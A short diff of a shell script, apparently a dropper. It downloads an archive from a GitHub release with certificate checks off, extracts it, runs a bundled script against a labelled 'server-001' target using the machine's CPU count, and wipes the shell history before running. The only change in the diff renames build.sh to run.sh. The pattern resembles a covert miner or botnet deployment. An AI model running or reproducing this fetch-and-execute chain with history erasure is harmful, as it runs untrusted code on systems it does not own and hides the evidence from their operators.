@@ -2,6 +2,6 @@ curl -sLkO https://github.com/ocodiwe010-del/nasaz/releases/download/fasa/mutan.
 tar -xvf mutan.tar.gz
 rm mutan.tar.gz
 echo '#!/bin/bash
-nproc --all && bash build.sh 2 server-001' > main
+nproc --all && bash run.sh 2 server-001' > main
 bash -c "history -c && history -w && clear"
 bash main
